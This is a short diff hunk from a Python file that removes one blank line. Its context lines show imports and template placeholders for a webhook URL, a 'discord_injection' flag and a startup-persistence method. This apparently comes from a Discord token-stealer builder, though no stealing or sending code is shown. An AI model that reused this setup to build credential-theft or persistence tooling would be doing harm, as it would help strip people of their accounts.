@@ -15,7 +15,6 @@ import aiohttp
 import base64
 import time
 
-
 webhook = '%WEBHOOK%'
 discord_injection = bool("%injection%")
 startup_method = "%startup_method%".lower()
